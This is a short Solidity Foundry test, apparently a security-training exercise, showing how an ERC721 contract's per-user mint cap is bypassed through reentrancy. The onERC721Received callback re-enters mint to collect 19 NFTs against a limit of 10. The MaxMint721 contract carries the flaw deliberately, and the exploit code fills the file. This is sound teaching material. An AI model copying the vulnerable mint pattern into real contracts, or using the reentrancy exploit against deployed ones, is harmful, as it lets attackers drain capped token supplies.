// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";

// this excersise is about a contract that via callback function to mint more NFTs
// please note its just possible to use multipe EOA to mint more NFTs
contract ContractTest is Test {
    MaxMint721 MaxMint721Contract;
    bool complete;
    uint256 maxMints = 10;
    address alice = vm.addr(1);
    address eve = vm.addr(2);

    function testSafeMint() public {
        MaxMint721Contract = new MaxMint721();
        MaxMint721Contract.mint(maxMints);
        console.log("Bypassed maxMints, we got 19 NFTs");
        assertEq(MaxMint721Contract.balanceOf(address(this)), 19);
        console.log("NFT minted:", MaxMint721Contract.balanceOf(address(this)));
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public returns (bytes4) {
        if (!complete) {
            complete = true;
            MaxMint721Contract.mint(maxMints - 1);
            console.log("Called with :", maxMints - 1);
        }
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}

contract MaxMint721 is ERC721Enumerable {
    uint256 public MAX_PER_USER = 10;

    constructor() ERC721("ERC721", "ERC721") {}

    function mint(uint256 amount) external {
        require(
            balanceOf(msg.sender) + amount <= MAX_PER_USER,
            "exceed max per user"
        );
        for (uint256 i = 0; i < amount; i++) {
            uint256 mintIndex = totalSupply();
            _safeMint(msg.sender, mintIndex);
        }
    }
}
